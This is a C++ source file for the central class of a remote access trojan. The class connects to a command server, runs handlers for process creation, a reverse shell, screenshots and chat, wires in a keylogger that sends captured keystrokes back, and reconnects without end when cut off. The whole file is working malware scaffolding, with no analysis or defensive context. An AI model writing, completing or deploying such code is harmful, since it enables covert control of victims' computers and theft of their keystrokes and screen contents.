#include "Rat.h"

#include "ChatHandler.h"
#include "CreateProcessHandler.h"
#include "ReverseShellHandler.h"
#include "TakeScreenshotHandler.h"
#include "Trace.h"

Rat::Rat(
	ICommunicationFactory* factory, 
	std::unique_ptr<IConnectionFactory> client
) :
	_client(std::move(client)),
	_connection(_client->Connect()),
	_sender(
		factory->CreateMessageSender(_connection.get())),
	_listener(
		factory->CreateMessageListener(
			_connection.get(),
			[this](const MessageType t, const SharedSpan c) { OnMessage(t, c); },
			[this] { OnDisconnection(); })),
	_handlers(GetHandlers()),
	_keyLogger(_sender.get())
{
}

std::map<MessageType, std::shared_ptr<IMessageHandler>> Rat::GetHandlers()
{
	const auto reverseShellHandler = std::make_shared<ReverseShellHandler>(_sender.get());


	return {
		{ MessageType::Chat, std::make_shared<ChatHandler>() },
		{ MessageType::CreateProcessS, std::make_shared<CreateProcessHandler>() },
		{ MessageType::StartReverseShell, reverseShellHandler },
		{ MessageType::StopReverseShell, reverseShellHandler },
		{ MessageType::ReverseShellMessage, reverseShellHandler },
		{ MessageType::TakeScreenshot, std::make_shared<TakeScreenshotHandler>(_sender.get())},
	};
}

void Rat::OnMessage(MessageType type, SharedSpan content)
{
	try
	{
		_handlers[type]->Handle(type, content);
	}
	catch (std::exception& e)
	{
		printf(e.what());
	}
}

void Rat::OnDisconnection()
{
	Trace("Server disconnected! Trying to reconnect\n");

	bool connected = false;
	while (!connected)
	{
		try
		{
			_connection.reset();
			_connection = _client->Connect();
			connected = true;
		}
		catch (std::runtime_error&)
		{
			Trace("Failed to connect! Trying to reconnect\n");
		}
	}
		
}
